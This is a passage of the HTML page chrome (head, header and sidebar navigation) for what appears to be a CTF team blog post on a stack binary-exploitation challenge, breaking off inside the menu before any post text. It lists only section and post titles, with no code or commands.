<!DOCTYPE html><html lang="en" class="no-js"><head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Walkthrough stack pwn challenge from WSIR 2023 (I designed it üòâ)">
      
      
        <meta name="author" content="D4rkNebula">
      
      
        <link rel="canonical" href="https://pr1m3dctf.github.io/blog/Blog-Posts/PWN-Stack-binary-exploiting-Writeup/">
      
      
        <link rel="prev" href="../HTB-Busqueda-Machine-Writeup/">
      
      
        <link rel="next" href="../../CVE/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
    
    
      
        <title>PWN - Stack binary exploiting Writeup - Pr1m3d Team Blog</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.e53b48f4.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../assets/css/extra.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  <link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
            html.glightbox-open { overflow: initial; height: 100%; }
            .gslide-title { margin-top: 0px; user-select: text; }
            .gslide-desc { color: #666; user-select: text; }
            .gslide-image img { background: white; }
            .gscrollbar-fixer { padding-right: 15px; }
            .gdesc-inner { font-size: 0.75rem; }
            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
        </style></head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="mydark" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#analysing-the-binary" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Pr1m3d Team Blog" class="md-header__button md-logo" aria-label="Pr1m3d Team Blog" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Pr1m3d Team Blog
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              PWN - Stack binary exploiting Writeup
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="mydark" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-label="Switch to light mode" type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="mylight" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-label="Switch to dark mode" type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"></path></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/Pr1m3dCTF/blog" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"></path></svg>
  </div>
  <div class="md-source__repository">
    Pr1m3dCTF/blog
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../.." class="md-tabs__link">
          
  
  
    
  
  Home

        </a>
      </li>
    
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../Researches/" class="md-tabs__link">
        
  
  
    
  
  Research

      </a>
    </li>
  

      
        
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../" class="md-tabs__link">
          
  
  
    
  
  Blog Post

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../CVE/" class="md-tabs__link">
          
  
  
    
  
  CVE

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../CTF/" class="md-tabs__link">
          
  
  
    
  
  CTF

        </a>
      </li>
    
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../Contact-Us/" class="md-tabs__link">
        
  
  
    
  
  Contact Us

      </a>
    </li>
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../About-Us/" class="md-tabs__link">
        
  
  
    
  
  About Us

      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Pr1m3d Team Blog" class="md-nav__button md-logo" aria-label="Pr1m3d Team Blog" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>

    </a>
    Pr1m3d Team Blog
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/Pr1m3dCTF/blog" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"></path></svg>
  </div>
  <div class="md-source__repository">
    Pr1m3dCTF/blog
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1">
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../.." class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    Home
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_1" id="__nav_1_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1">
            <span class="md-nav__icon md-icon"></span>
            Home
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Researches/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Research
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Blog Post
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CVE/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CVE
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CTF
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Contact-Us/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Contact Us
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../About-Us/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    About Us
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Researches/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Research
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
    
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    Blog Post
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Blog Post
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Android-Stack-Overflow-Exploitation-with-Frida/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Android Stack Overflow Exploitation with Frida
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Msfvenom-Android-Malware-Analysis/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Analyzing MSFVenom Android Payload
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Busqueda-Machine-Writeup/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    HTB Busqueda Machine Writeup
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    PWN - Stack binary exploiting Writeup
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    PWN - Stack binary exploiting Writeup
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#analysing-the-binary" class="md-nav__link">
    <span class="md-ellipsis">
      Analysing the binary
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#format-string" class="md-nav__link">
    <span class="md-ellipsis">
      Format String
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#assembly-is-fun" class="md-nav__link">
    <span class="md-ellipsis">
      Assembly is fun
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploiting" class="md-nav__link">
    <span class="md-ellipsis">
      Exploiting
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploiting">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#canary" class="md-nav__link">
    <span class="md-ellipsis">
      Canary üê¶
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#the-bof-xd" class="md-nav__link">
    <span class="md-ellipsis">
      THE BOF xD
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#authors" class="md-nav__link">
    <span class="md-ellipsis">
      Authors
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4">
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../CVE/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    CVE
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            CVE
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CVE/CVE-2023-48114/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Stored XSS in Email Body of SmarterMail (CVE-2023-48114)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CVE/CVE-2023-48115/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Stored DOM XSS in Email Body of SmarterMail (CVE-2023-48115)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CVE/CVE-2023-48116/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Stored XSS in Calendar component of SmarterMail (CVE-2023-48116)
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5">
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../CTF/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    CTF
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            CTF
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2">
        
          
          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2">
            <span class="md-nav__icon md-icon"></span>
            writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_1">
        
          
          <label class="md-nav__link" for="__nav_5_2_1" id="__nav_5_2_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    2023
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_1">
            <span class="md-nav__icon md-icon"></span>
            2023
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_1_1">
        
          
          <label class="md-nav__link" for="__nav_5_2_1_1" id="__nav_5_2_1_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Cyber Apocalypse 2023
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_5_2_1_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_1_1">
            <span class="md-nav__icon md-icon"></span>
            Cyber Apocalypse 2023
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_1_1_1">
        
          
          <label class="md-nav__link" for="__nav_5_2_1_1_1" id="__nav_5_2_1_1_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    crypto
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_5_2_1_1_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_1_1_1">
            <span class="md-nav__icon md-icon"></span>
            crypto
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2023/cyber-apocalypse-2023/crypto/inside_the_matrix/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    inside the matrix
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2023/cyber-apocalypse-2023/crypto/multipage_recyclings/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    multipage recyclings
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2023/cyber-apocalypse-2023/crypto/perfect_synchronization/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    perfect synchronization
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2023/cyber-apocalypse-2023/crypto/small_steps/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    small steps
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_1_1_2">
        
          
          <label class="md-nav__link" for="__nav_5_2_1_1_2" id="__nav_5_2_1_1_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    blockchain
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_5_2_1_1_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_1_1_2">
            <span class="md-nav__icon md-icon"></span>
            blockchain
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2023/cyber-apocalypse-2023/blockchain/navigating_the_unknown/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    navigating the unknown
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2023/cyber-apocalypse-2023/blockchain/shooting_101/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    shooting 101
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_1_1_3">
        
          
          <label class="md-nav__link" for="__nav_5_2_1_1_3" id="__nav_5_2_1_1_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    web
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_5_2_1_1_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_1_1_3">
            <span class="md-nav__icon md-icon"></span>
            web
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/writeups/2023/cyber-apocalypse-2023/web/passman/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    passman
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_1_1_4">
        
          
          <label class="md-nav__link" for="__nav_5_2_1_1_4" id="__nav_5_2_1_1_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    hardware
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_5_2_1_1_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2_1_1_4">
